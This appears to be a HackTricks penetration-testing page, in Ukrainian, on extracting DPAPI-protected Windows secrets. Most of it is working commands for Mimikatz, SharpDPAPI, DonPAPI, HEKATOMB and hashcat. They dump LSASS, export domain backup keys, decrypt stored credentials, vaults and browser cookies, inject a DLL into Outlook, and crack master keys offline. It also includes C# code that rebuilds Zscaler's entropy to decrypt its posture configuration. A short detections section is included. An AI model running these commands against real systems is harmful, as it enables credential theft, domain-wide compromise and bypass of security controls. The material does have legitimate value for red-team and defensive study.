# DPAPI - Витяг паролів

{{#include ../../banners/hacktricks-training.md}}



## Що таке DPAPI

The Data Protection API (DPAPI) в першу чергу використовується в операційній системі Windows для **симетричного шифрування асиметричних приватних ключів**, використовуючи або секрети користувача, або системні секрети як значне джерело ентропії. Такий підхід спрощує шифрування для розробників, дозволяючи їм шифрувати дані за допомогою ключа, похідного від логон-секретів користувача або, для системного шифрування, від секретів аутентифікації домену системи, тим самим звільняючи розробників від необхідності самостійно захищати ключ шифрування.

Найпоширеніший спосіб використання DPAPI — через функції **`CryptProtectData` and `CryptUnprotectData`**, які дозволяють застосункам безпечно шифрувати та дешифрувати дані в межах сесії процесу, що наразі ввійшов у систему. Це означає, що зашифровані дані можуть бути розшифровані тільки тим самим користувачем або системою, що їх зашифрувала.

Крім того, ці функції також приймають **`entropy` parameter**, який також використовується під час шифрування та розшифрування, тому щоб розшифрувати щось, що було зашифроване з використанням цього параметра, ви повинні надати те саме значення entropy, яке використовувалося при шифруванні.

### Генерація ключів користувачів

DPAPI генерує унікальний ключ (названий **`pre-key`**) для кожного користувача на основі їхніх облікових даних. Цей ключ виводиться з пароля користувача та інших факторів, і алгоритм залежить від типу користувача, але в підсумку це SHA1. Наприклад, для доменних користувачів **він залежить від NTLM-хеша користувача**.

Це особливо цікаво тому, що якщо зловмисник може отримати хеш пароля користувача, він може:

- **Decrypt any data that was encrypted using DPAPI** з використанням ключа цього користувача без необхідності звертатися до будь-якого API
- Спробувати **зламати пароль** офлайн, намагаючись згенерувати валідний DPAPI ключ

Крім того, кожного разу, коли користувач шифрує деякі дані за допомогою DPAPI, генерується новий **master key**. Цей master key фактично використовується для шифрування даних. Кожному master key присвоюється **GUID** (Globally Unique Identifier), який його ідентифікує.

Master keys зберігаються в директорії **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, де `{SID}` — це Security Identifier цього користувача. Master key зберігається зашифрованим користувацьким **`pre-key`** і також зашифрованим доменним резервним ключем для відновлення (тому той самий ключ зберігається зашифрованим двічі — двома різними способами).

Зауважте, що **доменний ключ, який використовується для шифрування master key, знаходиться на domain controllers і ніколи не змінюється**, тож якщо зловмисник має доступ до контролера домену, він може отримати доменний резервний ключ і розшифрувати master keys усіх користувачів у домені.

Зашифровані блоби містять **GUID master key**, який було використано для шифрування даних, у своїх заголовках.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Це ключ, який використовується машиною для шифрування даних. Він базується на **DPAPI_SYSTEM LSA secret**, це спеціальний ключ, до якого може отримати доступ лише користувач SYSTEM. Цей ключ використовується для шифрування даних, які повинні бути доступні самій системі, наприклад облікових даних на рівні машини або системних секретів.

Зауважте, що ці ключі **не мають резервної копії для домену**, тому вони доступні лише локально:

- **Mimikatz** може отримати до них доступ, дампуючи LSA secrets за допомогою команди: `mimikatz lsadump::secrets`
- Секрет зберігається в реєстрі, тож адміністратор може **змінити дозволи DACL, щоб отримати доступ**. Шлях у реєстрі: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Серед персональних даних, захищених DPAPI, є:

- Windows creds
- Паролі та дані автозаповнення Internet Explorer і Google Chrome
- Паролі e-mail та внутрішніх FTP-акаунтів для застосунків, таких як Outlook і Windows Mail
- Паролі до спільних папок, ресурсів, бездротових мереж і Windows Vault, включаючи ключі шифрування
- Паролі для підключень віддаленого робочого столу, .NET Passport та приватні ключі для різних цілей шифрування й автентифікації
- Мережеві паролі, які керуються Credential Manager, та персональні дані в застосунках, що використовують CryptProtectData, такі як Skype, MSN messenger тощо
- Зашифровані блоби у реєстрі
- ...

Системні захищені дані включають:
- паролі WiFi
- паролі запланованих завдань
- ...

### Master key extraction options

- Якщо користувач має domain admin privileges, він може отримати доступ до ключа резервної копії домену, щоб розшифрувати всі master keys користувачів у домені:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Маючи local admin privileges, можливо **отримати доступ до пам'яті LSASS**, щоб витягти DPAPI master keys усіх підключених користувачів і ключ SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Якщо користувач має локальні права адміністратора, він може отримати доступ до **DPAPI_SYSTEM LSA secret**, щоб розшифрувати machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Якщо відомий пароль або NTLM hash користувача, ви можете **безпосередньо розшифрувати master-ключі користувача**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Якщо ви перебуваєте в сесії як користувач, можна звернутися до DC за **backup key to decrypt the master keys using RPC**. Якщо ви local admin і користувач увійшов у систему, ви можете **steal his session token** для цього:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Список сховищ
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Доступ до зашифрованих даних DPAPI

### Знайти зашифровані дані DPAPI

Типові **захищені файли** користувачів знаходяться в:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Перевірте також заміну `\Roaming\` на `\Local\` у наведених вище шляхах.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) може знайти DPAPI encrypted blobs у файловій системі, реєстрі та B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Зверніть увагу, що [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (з того ж репозиторію) можна використовувати для розшифрування (через DPAPI) конфіденційних даних, таких як cookies.

### Ключі доступу та дані

- **Use SharpDPAPI** щоб витягти облікові дані з файлів, зашифрованих DPAPI, у поточній сесії:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Отримати інформацію про облікові дані** (наприклад, зашифровані дані та guidMasterKey).
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Розшифрувати masterkey користувача, який запросив **domain backup key**, використовуючи RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для дешифрування masterkey (зверніть увагу, як можна використовувати `/rpc` щоб отримати резервний ключ домену, `/password` щоб використати пароль у відкритому вигляді, або `/pvk` щоб вказати файл приватного ключа DPAPI домену...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Розшифрувати дані за допомогою masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Інструмент **SharpDPAPI** також підтримує ці аргументи для дешифрування `credentials|vaults|rdg|keepass|triage|blob|ps` (зверніть увагу, що можна використовувати `/rpc` щоб отримати резервний ключ домену, `/password` щоб використати plaintext password, `/pvk` щоб вказати файл приватного ключа DPAPI домену, `/unprotect` щоб використовувати поточну сесію користувача...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Розшифрувати деякі дані, використовуючи **поточну сесію користувача**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Обробка опційної ентропії ("Third-party entropy")

Деякі застосунки передають додаткове значення **entropy** до `CryptProtectData`. Без цього значення blob не може бути розшифрований, навіть якщо відомий правильний masterkey. Отже, отримання entropy є критично важливим при націлюванні на облікові дані, захищені таким чином (наприклад Microsoft Outlook, деякі VPN-клієнти).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) — це user-mode DLL, яка перехоплює функції DPAPI всередині цільового процесу і прозоро записує будь-яку опційну **entropy**, що передається. Запуск EntropyCapture у режимі **DLL-injection** проти процесів на кшталт `outlook.exe` або `vpnclient.exe` створить файл, який зіставляє кожен буфер entropy із процесом-викликом та відповідним blob. Захоплену entropy можна пізніше передати до **SharpDPAPI** (`/entropy:`) або **Mimikatz** (`/entropy:<file>`) для розшифрування даних.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Злом майстер-ключів офлайн (Hashcat & DPAPISnoop)

Microsoft представила формат майстер-ключа **context 3**, починаючи з Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) додав hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3), що дозволяє GPU-accelerated ламання паролів користувачів безпосередньо з файлу майстер-ключа. Тому зловмисники можуть виконувати word-list або brute-force атаки без взаємодії з цільовою системою.

`DPAPISnoop` (2024) автоматизує процес:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Інструмент також може парсити Credential і Vault blobs, дешифрувати їх зламаними ключами і експортувати cleartext passwords.

### Доступ до даних іншої машини

У **SharpDPAPI and SharpChrome** можна вказати опцію **`/server:HOST`**, щоб отримати доступ до даних віддаленої машини. Звісно, вам потрібно мати доступ до тієї машини, і в наведеному прикладі припускається, що **ключ шифрування резервної копії домену відомий**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Інші інструменти

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) — інструмент, який автоматизує витяг усіх користувачів і комп’ютерів з LDAP-каталогу та витяг domain controller backup key через RPC. Скрипт потім резолвить IP-адреси всіх комп’ютерів і виконує smbclient на всіх машинах, щоб отримати всі DPAPI blobs усіх користувачів і розшифрувати все за допомогою domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

За допомогою списку комп’ютерів, отриманого з LDAP, ви можете знайти кожну підмережу, навіть якщо ви про неї не знали!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) може автоматично дампити секрети, захищені DPAPI. Реліз 2.x ввів:

* Паралельний збір blobs з сотень хостів
* Парсинг **context 3** masterkeys та автоматична інтеграція з Hashcat для cracking
* Підтримка Chrome "App-Bound" зашифрованих cookies (див. наступний розділ)
* Новий режим **`--snapshot`** для періодичного опитування кінцевих точок і порівняння новостворених blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) — C# parser для файлів masterkey/credential/vault, який може виводити формати Hashcat/JtR і опційно автоматично запускати cracking. Повністю підтримує machine і user masterkey формати до Windows 11 24H1.


## Типові виявлення

- Доступ до файлів у `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` та інших каталогах, пов’язаних з DPAPI.
- Особливо через мережевий ресурс на кшталт **C$** або **ADMIN$**.
- Використання **Mimikatz**, **SharpDPAPI** або подібних інструментів для доступу до пам’яті LSASS або дампу masterkeys.
- Подія **4662**: *An operation was performed on an object* – може корелюватися з доступом до об’єкта **`BCKUPKEY`**.
- Подія **4673/4674** коли процес запитує *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 уразливості та зміни екосистеми

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (листопад 2023). Атакуючий з доступом до мережі міг обманути членa домену, щоб отримати шкідливий DPAPI backup key, що дозволяло розшифрувати user masterkeys. Виправлено в листопадовому кумулятивному оновленні 2023 — адміністраторам слід переконатися, що DCs та робочі станції повністю оновлені.
* **Chrome 127 “App-Bound” cookie encryption** (липень 2024) замінила застарілий захист, що покладався лише на DPAPI, додатковим ключем, який зберігається в **Credential Manager** користувача. Офлайн-розшифровка cookies тепер вимагає як DPAPI masterkey, так і **GCM-wrapped app-bound key**. SharpChrome v2.3 та DonPAPI 2.x можуть відновити цей додатковий ключ при виконанні в контексті користувача.


### Кейс: Zscaler Client Connector – Налаштована ентропія, похідна від SID

Zscaler Client Connector зберігає кілька конфігураційних файлів у `C:\ProgramData\Zscaler` (наприклад `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Кожний файл зашифрований з використанням **DPAPI (Machine scope)**, але вендор постачає **custom entropy**, який *обчислюється під час виконання* замість збереження на диску.

Ентропія відновлюється з двох елементів:

1. Жорстко вбудований секрет, вкладений у `ZSACredentialProvider.dll`.
2. **SID** облікового запису Windows, якому належить конфігурація.

Алгоритм, реалізований DLL, еквівалентний:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Оскільки секрет вбудований у DLL, яку можна прочитати з диска, **будь-який локальний зловмисник з правами SYSTEM може відтворити ентропію для будь-якого SID** і розшифрувати blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Розшифрування дає повну JSON-конфігурацію, включно з кожною **перевіркою стану пристрою** та її очікуваним значенням — інформацією, яка дуже цінна при спробах обходів на стороні клієнта.

> TIP: інші зашифровані артефакти (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) захищені DPAPI **без** ентропії (`16` нульових байтів). Тому їх можна безпосередньо розшифрувати за допомогою `ProtectedData.Unprotect`, коли будуть отримані привілеї SYSTEM.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
